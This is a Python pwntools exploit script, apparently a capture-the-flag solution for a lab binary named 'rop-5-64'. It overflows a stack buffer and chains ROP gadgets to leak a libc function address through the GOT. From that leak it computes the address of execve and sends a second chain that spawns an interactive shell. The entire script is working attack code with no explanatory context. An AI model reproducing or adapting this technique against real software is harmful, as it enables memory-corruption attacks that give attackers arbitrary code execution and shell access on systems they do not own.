from pwn import *

GARB = 'bbbbbbbb'

# Requires symlink from puts to sh binary

execve_init_addr = 0x7fa4ec952770
prctl_init_addr = 0x7fa4ec98dc50
offset = execve_init_addr - prctl_init_addr

# Addresses needed for the attack
pop_rdi_ret_addr = 0x400763 # From ROPgadget --binary ./rop-5-64
pop_rsi_pop_r15_ret_addr = 0x400761 # From ROPgadget --binary ./rop-5-64
pop_rdx_pop_rbp_ret_addr = 0x400688 # From ROPgadget --binary ./rop-5-64
puts_addr = ELF('./rop-5-64').symbols['puts']
strcpy_addr = ELF('./rop-5-64').symbols['strcpy']
input_func_addr = ELF('./rop-5-64').symbols['input_func']
data_start_addr = 0x601048 # Address of the data area
got_addr = 0x601038 # Address of the got entry
puts_string_addr = 0x400392

# Build rop chain
inp = ('a' * 0x80) + GARB
inp = inp + p64(pop_rdi_ret_addr) + p64(data_start_addr) + p64(pop_rsi_pop_r15_ret_addr) + p64(got_addr) + GARB + p64(strcpy_addr)
inp = inp + p64(pop_rdi_ret_addr) + p64(data_start_addr) + p64(puts_addr)
inp = inp + p64(input_func_addr)

# Launch processs and send rop chain
p = process('./rop-5-64')
p.send(inp)

# Use privilleged shell to get the flag
# p.interactive()
data = p.recv()
print(data.split('\n'))
addy = data.split('\n')[2]
l1 = [addy, '\0', '\0']
addy = ''.join(l1)
prctl_addr = u64(addy)
print(prctl_addr)
execve_addr = prctl_addr + offset
print(execve_addr)

inp = ('a' * 0x80) + GARB + p64(execve_addr) + GARB + p64(puts_string_addr) + p64(0) + p64(0)
inp = ('a' * 0x80) + GARB + p64(pop_rdi_ret_addr) + p64(puts_string_addr) + p64(pop_rsi_pop_r15_ret_addr) + p64(0) + GARB + p64(pop_rdx_pop_rbp_ret_addr) + p64(0) + GARB + p64(execve_addr)
p.send(inp)
p.interactive()
